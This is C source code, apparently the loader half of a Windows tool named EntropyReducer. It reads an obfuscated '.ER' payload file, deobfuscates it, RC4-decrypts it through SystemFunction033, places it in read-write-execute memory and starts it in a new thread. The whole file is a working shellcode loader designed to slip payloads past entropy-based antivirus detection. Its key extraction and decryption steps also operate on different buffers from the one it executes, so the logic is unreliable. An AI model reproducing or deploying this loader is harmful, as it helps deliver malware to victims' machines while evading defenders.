#include <Windows.h>
#include <stdio.h>
#include "EntropyReducer.h"

// Function to report WinApi Errors
BOOL ReportError(const char* WinApiName) {
    printf("[!] \"%s\" [ FAILED ] \t%d \n", WinApiName, GetLastError());
    return FALSE;
}

// Function to Decrypt the RC4 encrypted Payload
BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    NTSTATUS STATUS = 0;

    // Defining the key as a USTRING structure
    USTRING Key = {
        .Buffer = pRc4Key,
        .Length = (USHORT)dwRc4KeySize,
        .MaximumLength = (USHORT)dwRc4KeySize
    };

    // Defining the Encrypted Data as a USTRING Structure
    USTRING Data = {
        .Buffer = pPayloadData,
        .Length = (USHORT)sPayloadSize,
        .MaximumLength = (USHORT)sPayloadSize
    };

    // Exporting SystemFunction033 from the Advapi32.dll
    HMODULE hAdvapi32 = LoadLibraryA("Advapi32");
    if (!hAdvapi32) {
        return ReportError("LoadLibraryA");
    }
    fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(hAdvapi32, "SystemFunction033");
    if (!SystemFunction033) {
        return ReportError("GetProcAddress");
    }

    // Calling the SystemFunction033
    if ((STATUS = SystemFunction033(&Data, &Key)) != 0x0) {
        printf("[!] SystemFunction033 FAILED With Error: 0x%0.8X \n", STATUS);
        return FALSE;
    }

    return TRUE;
}

int main(int argc, char* argv[]) {
    
    if (!(argc >= 2)) {
        printf("[!] Please Specify Input '.ER' File To Run ... \n");
        return -1;
    }

	// Defining the Key
    unsigned char _key[0x10] = { 0 };

    printf("[i] BUFF_SIZE : [ 0x%0.4X ] - NULL_BYTES : [ 0x%0.4X ]\n", BUFF_SIZE, NULL_BYTES);

    HANDLE hFile = INVALID_HANDLE_VALUE, hThread = NULL;
    DWORD dwFileSize = 0, dwNumberOfBytesRead = 0;
    PBYTE pBuffer = NULL;

	// Reading the Encrypted Payload
    hFile = CreateFileA((LPCSTR)argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return ReportError("CreateFileA");

	// Reading the File Size
    if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE)
        return ReportError("GetFileSize");

	// Allocating Memory for the Encrypted Payload
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
    if (!pBuffer)
        return ReportError("HeapAlloc");

	// Reading the Encrypted Payload
    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != dwFileSize) {
        printf("[i] Read %ld from %ld Bytes \n", dwNumberOfBytesRead, dwFileSize);
        return ReportError("ReadFile");
    }

    CloseHandle(hFile);

    // Deobfuscate the Payload
    SIZE_T DeobfuscatedPayloadSize = 0;
    PBYTE DeobfuscatedPayloadBuffer = NULL;

    printf("[i] Deobfuscating \"%s\" ... ", argv[1]);
    if (!Deobfuscate(pBuffer, dwFileSize, &DeobfuscatedPayloadBuffer, &DeobfuscatedPayloadSize)) {
        return -1;
    }
    printf("[+] DONE \n");
    printf("\t>>> Deobfuscated Payload Size : %ld \n\t>>> Deobfuscated Payload Located At : 0x%p \n", DeobfuscatedPayloadSize, DeobfuscatedPayloadBuffer);

    // Extracting the Key from the payload and updating the pointer to be after the key
    memcpy(_key, pBuffer, 0x10); // copy the first 16 bytes to _key
    pBuffer = (PVOID)((ULONG_PTR)pBuffer + 0x10); // update pointer to be after the first 16
    printf("[+] Pointer Updated\n");

    printf("[i] Decrypting with %p\n", pBuffer);
    printf("[i] Retrieved Key: [ ");
    for (size_t i = 0; i < sizeof(_key); i++)
        printf("%02X ", _key[i]);
    printf("]\n");

    DWORD dwResourceDataSize = (DWORD)(DeobfuscatedPayloadSize - 0x10);

    // Decrypt the payload
    Rc4EncryptionViSystemFunc033(_key, (PBYTE)pBuffer, sizeof(_key), dwResourceDataSize);

    printf("[+] Payload Decrypted at : %p\n", pBuffer);
    printf("[$] Press <Enter> To Run ... ");
    getchar();

	// Allocate Memory for the Decrypted Payload
    PVOID pExecAddress = VirtualAlloc(NULL, DeobfuscatedPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pExecAddress)
        return ReportError("VirtualAlloc");
    
	// Copy the Decrypted Payload to the Executable Memory
    memcpy(pExecAddress, DeobfuscatedPayloadBuffer, DeobfuscatedPayloadSize);

    printf("[i] Running Payload Thread ... ");

	// Create a Thread to Run the Decrypted Payload
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecAddress, NULL, 0, NULL);
    if (!hThread)
        return ReportError("CreateThread");

	// Wait for the Thread to Finish
    WaitForSingleObject(hThread, INFINITE);

    printf("[+] DONE \n");

    return 0;
}